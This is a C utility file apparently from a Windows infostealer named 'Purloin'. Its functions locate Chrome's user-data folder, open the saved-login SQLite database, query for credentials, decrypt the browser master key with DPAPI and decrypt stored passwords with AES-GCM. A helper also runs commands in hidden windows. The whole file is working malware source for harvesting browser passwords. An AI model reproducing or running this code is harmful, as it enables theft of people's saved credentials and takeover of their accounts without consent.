#include "includes/Purloin_Utils.h"
#include "includes/Purloin_Debug.h"

// Converts CHAR in Base64 to Bytes.  User must free the byte data after usage.
BOOL base64_to_byte(PCHAR base64_string, BYTE** byte_string, PDWORD size_byte_string) {
	/* To Convert CHAR form of Base64 encoded master key to Byte form, the resulting buffer size is needed, so 'size_byte_master_key' is passed to get that value */
	if (!(CryptStringToBinaryA(base64_string, 0, CRYPT_STRING_BASE64, NULL, size_byte_string, NULL, NULL))) {
		return FALSE;
	}
	/* Using above 'size_byte_master_key', a buffer is created to hold Byte form of Base64 encoded master key */
	*byte_string = (BYTE*)malloc(*size_byte_string);
	if (!*byte_string) {
		return FALSE;
	}
	/* Convert Base64 encoded master key into byte form */
	if (!(CryptStringToBinaryA(base64_string, 0, CRYPT_STRING_BASE64, *byte_string, size_byte_string, NULL, NULL))) {
		return FALSE;
	}
	return TRUE;
}

// Decrypts data that is encrypted using DPAPI API.
BOOL dpapi_decrypt(BYTE* encrypted_data, DWORD size_encrypted_data, DATA_BLOB* decrypted_data) {
	DATA_BLOB blob_enc_masterkey;
	blob_enc_masterkey.cbData = size_encrypted_data;
	blob_enc_masterkey.pbData = encrypted_data;
	if (!(CryptUnprotectData(&blob_enc_masterkey, NULL, NULL, NULL, NULL, 0, decrypted_data))) {
		return FALSE;
	}
	return TRUE;
}

BOOL aesgcm_decrypt(BCRYPT_KEY_HANDLE handle_bcrypt, DWORD offset, BYTE* encrypted_password, int* size_encrypted_datablob, BYTE* iv, DWORD size_iv, BYTE* tag, DWORD size_tag, BYTE** decrypted_byte, PULONG decrypted_byte_size) {
	/* Set Additional info to the struct */
	BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO aes_gcm_info;						// Struct to hold additional information required for decrypting (Nonce, Tag)
	BCRYPT_INIT_AUTH_MODE_INFO(aes_gcm_info);
	aes_gcm_info.pbNonce = iv;
	aes_gcm_info.cbNonce = size_iv;
	aes_gcm_info.pbTag = tag;
	aes_gcm_info.cbTag = size_tag;

	/* Get the buffer size required to hold the decrypted bytes to the 'size_required_decrypted_buffer' */
	ULONG size_required_decrypted_buffer;									// To get the size required to hold decrypted bytes
	NTSTATUS status;
	status = BCryptDecrypt(handle_bcrypt, encrypted_password, *size_encrypted_datablob - (offset + size_iv + size_tag), &aes_gcm_info, NULL, 0, NULL, 0, &size_required_decrypted_buffer, 0);
	if (!NT_SUCCESS(status)) {
		return FALSE;
	}

	/* In case if the existing buffer size is not enough, Resize it to fit */
	if (size_required_decrypted_buffer > *decrypted_byte_size) {
		BYTE* tmp_byte;															// Temporary pointer, in case if the buffer to hold decrypted bytes is not enough
		tmp_byte = (BYTE*)realloc(*decrypted_byte, size_required_decrypted_buffer);

		if (!tmp_byte) {
			return FALSE;
		}
		else {
			*decrypted_byte = tmp_byte;
			*decrypted_byte_size = size_required_decrypted_buffer;
		}
	}

	/* Actual decryption process */
	status = BCryptDecrypt(handle_bcrypt, encrypted_password, *size_encrypted_datablob - (offset + size_iv + size_tag), &aes_gcm_info, NULL, 0, *decrypted_byte, *decrypted_byte_size, &size_required_decrypted_buffer, 0);
	if (!NT_SUCCESS(status)) {
		return FALSE;
	}

	return TRUE;
}

// Gets the browser directory specified by the FOLDER_ID (look at win32 docs) and the relative path from that FOLDER_ID
DWORD get_user_dir(GUID folder_id, PCWSTR browser_location, PWSTR buf_path, PSTR buf_outMsg, WORD buf_outSize) {
	PWSTR p_temp_userdata_location = NULL;															// Temporary pointer to hold returned user data (%LOCALAPPDATA%, %APPDATA%, etc.) folder path
	HRESULT hr;																						// Error handling 
	errno_t err;																					// Error handling 

	/* Get Local Appdata Directory of the user */
	if (FAILED(hr = SHGetKnownFolderPath(folder_id, 0, NULL, &p_temp_userdata_location))) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_user_dir: SHGetKnownFolderPath: Getting Local Appdata Directory error code: %ld\n", hr);)
		CoTaskMemFree(p_temp_userdata_location);
		return FALSE;
	}

	/* Copy %LOCALAPPDATA% location to permenant buffer */
	if ((err = wmemcpy_s(buf_path, MAX_PATH, p_temp_userdata_location, lstrlenW(p_temp_userdata_location))) != 0) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_user_dir: wmemcpy_s: Copying %%LOCALAPPDATA%% to buffer error code: %d\n", err);)
		return FALSE;
	}

	/* Copy relative path of Chrome directory from %LOCALAPPDATA% to permenant buffer */
	if ((err = wmemcpy_s(buf_path + lstrlenW(p_temp_userdata_location), MAX_PATH, browser_location, lstrlenW(browser_location)+1)) != 0) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_user_dir: wmemcpy_s: Copying Chrome Userdata folder to buffer error code: %d\n", err);)
		return FALSE;
	}

	/* Check if that Chrome path exitsts */
	if (!PathFileExistsW(buf_path)) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_user_dir: PathFileExistsW: No folder found.\n");)
		return FALSE;
	}

	/* Free the memory allocated by temporary buffer to hold the %LOCALAPPDATA% folder */
	CoTaskMemFree(p_temp_userdata_location);
	return TRUE;
}

// Check if specified 'test_string' is in 'substring'
BOOL checkSubtring(const CHAR* substring, PCHAR test_string) {
	if (lstrlenA(substring) <= lstrlenA(test_string)) {
		for (int i = 0; i < lstrlenA(substring); i++) {
			if (substring[i] != test_string[i]) return FALSE;
		}
		return TRUE;
	}
	return FALSE;
}

// Gets file/directory exploration handle and a struct that contains info about the found files/sub-directories of the specified directory. Which then can be used to call FileNextA() to iterate over found files/sub-dirs. 
BOOL get_file_explorer(PSTR chrome_dir, WIN32_FIND_DATAA* dir_files, HANDLE* dir_handle, PSTR buf_outMsg, WORD buf_outSize) {
	errno_t err;

	/* Append '\*' to the chrome_dir to get the file handle for the '%LOCALAPPDATA%\Google\Chrome\User Data\*' folder */
	if ((err = strcat_s(chrome_dir, MAX_PATH, "\\*")) != 0) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "strcat_s: Appending '\\\\*' to chrome_dir error: %d\n", err);)
		return FALSE;
	}

	/* Gets the first file/folder handle in the directory, and set it to 'dir_handle' */
	*dir_handle = FindFirstFileA(chrome_dir, dir_files);
	if (dir_handle == INVALID_HANDLE_VALUE) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "Getting sub directories error: %lu\n", GetLastError());)
		return FALSE;
	}

	/* Clears the ending '\*' part in the chrome_dir */
	memset(chrome_dir + lstrlenA(chrome_dir) - 2, '\0', 2);

	return TRUE;
}

// Open database connection
BOOL open_database(PSTR database_location, void** handle_db, PSTR buf_outMsg, WORD buf_outSize, BOOL open_copied_instance) {
	errno_t err;
	int status;
	CHAR temp_database_location[MAX_PATH] = "\0";

	if ((err = strcat_s(temp_database_location, MAX_PATH, database_location)) != 0) {											// Apend '\\' to the end of chrome_dir_char to make the path for Login Data file for a specific user profile
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "strcat_s: Appending '\\\\' to database_location error: %d\n", err);)
		return FALSE;
	}

	if (open_copied_instance) {
		if ((err = strcat_s(temp_database_location, MAX_PATH, "2")) != 0) {									// Append "Default" or "Profile \d?" to the end of chrome_dir_char
			Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "strcat_s: Appending profile name to database_location error: %d\n", err);)
			return FALSE;
		}
	}

	if ((status = sqlite3_open_v2(temp_database_location, (sqlite3**)handle_db, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK) {	// Opens the connection to database
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "sqlite3_open_v2: Error when opening database connection error: %s:%d\n", sqlite3_errmsg(*(sqlite3**)handle_db), status);)
		return FALSE;
	}

	return TRUE;
}

// Prepare and get the sql handle for sql statement in order to retrieve credentials
BOOL prepare_sql(void* handle_db, void** handle_sql_stmt, const char * sql_stmt, PSTR buf_outMsg, WORD buf_outSize) {
	int status;
	if ((status = sqlite3_prepare_v2((sqlite3*)handle_db, sql_stmt, -1, (sqlite3_stmt**)handle_sql_stmt, 0)) != SQLITE_OK) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "sqlite3_prepare_v2: Error when preaparing statement, error: %s:%d\n", sqlite3_errmsg((sqlite3*)handle_db), status);)
		return FALSE;
	}
	return TRUE;
}

// Iterate over results
BOOL iterate_result(void* handle_sql_stmt) {
	if ((sqlite3_step((sqlite3_stmt*)handle_sql_stmt)) == SQLITE_ROW)
		return TRUE;
	else
		return FALSE;
}

// Gets the result of the given index and the type
void* get_result(void* handle_sql_stmt, int index, int type) {
	if (type == TEXT_RESULT) {
		return (void *)sqlite3_column_text((sqlite3_stmt*)handle_sql_stmt, index);
	}
	else if (type == BYTE_RESULT) {
		return (void*)sqlite3_column_blob((sqlite3_stmt*)handle_sql_stmt, index);
	}
}

// Gets the size of the result of the given index
int get_result_size(void* handle_sql_stmt, int index) {
	return sqlite3_column_bytes((sqlite3_stmt*)handle_sql_stmt, index);
}

// Close database connection
BOOL close_database(void* handle_db, void* handle_sql_stmt, PSTR buf_outMsg, WORD buf_outSize) {
	/* Reset SQL statement */
	NTSTATUS status;
	if ((status = sqlite3_reset((sqlite3_stmt*)handle_sql_stmt)) != 0) {
		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "sqlite3_reset: %s:%d\n", sqlite3_errmsg((sqlite3*)handle_db), status);)
		return FALSE;
	}

	/* Close the opened database */
	sqlite3_close((sqlite3*)handle_db);
	return TRUE;
}

// Executes system command
BOOL execute_system(LPCWSTR command) {
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (CreateProcessW(command, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return TRUE;
	}
	else {
		return FALSE;
	}
	
}